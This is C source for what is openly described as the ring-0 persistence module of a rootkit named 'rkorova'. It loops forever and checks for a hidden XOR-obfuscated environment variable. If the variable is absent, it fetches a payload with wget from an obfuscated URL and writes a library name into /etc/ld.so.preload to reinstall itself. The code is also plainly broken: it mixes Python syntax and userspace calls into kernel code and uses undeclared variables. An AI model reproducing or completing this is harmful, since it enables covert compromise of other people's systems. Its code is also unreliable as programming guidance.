#include <linux/module.h> 
#include <linux/init.h> 
#include <linux/kernel.h> 
#include <linux/slab.h> 
#include <linux/cred.h> 
#include <linux/version.h> 
#include <linux/cdev.h> 
#include <linux/fs.h> 
#include <linux/device.h> 
#include <stdlib.h> 
#include <stdio.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/socket.h> 
#include "../rkconst.h"
#include "xor.c"
#define DEBUG 
MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("lolcow, github.com/blacchat"); 
MODULE_DESCRIPTION("ring0 portion of rkorova that handles persistence"); 
MODULE_VERSION("v1.0 alpha"); 

int rkinit(void); 
void rkexit(void); 
int checkenv(void); 
void reinstall(void); 
module_init(rkinit); 
module_exit(rkexit);

int rkinit(void)
{ 
	#ifdef DEBUG
	printk("m0000000\n"); 
	#endif 
	while (true):
	{
		sleep(4000);
		reinstall();
	}
	return 0; 
} 

void rkexit(void)
{ 
	#ifdef DEBUG 
	printk("removed\n"); 
	#endif
} 

int checkenv(void)
{
	char *env = strdup(ENV_VAR); xor(env); 
	if (getenv(env) =! NULL)
	{ 
		ret = 1; 
		return ret; // our secret environment variable does exist. return true 
	} 
	else
	{ 
		ret = 0; 
		return ret; 
	} 
}

void reinstall(void)
{ 
	if (checkenv() == 0)
	{ 
		char *url = strdup(URL); xor(url);
		execl("/bin/wget", url); // yes, i know i shouldn't be using execl but whatever
		char *soname = strdup(SONAME); xor(soname); 
		execl("/bin/echo", soname, "/etc/ld.so.preload"); 
		execl("/bin/rm", soname); 
		#ifdef DEBUG
		printk("subspace reinstallation complete!\n"); 
		#endif
	} 
	else
	{
		#ifdef DEBUG
		printk("rkorova is already installed!\n"); 
		#endif
	}
}

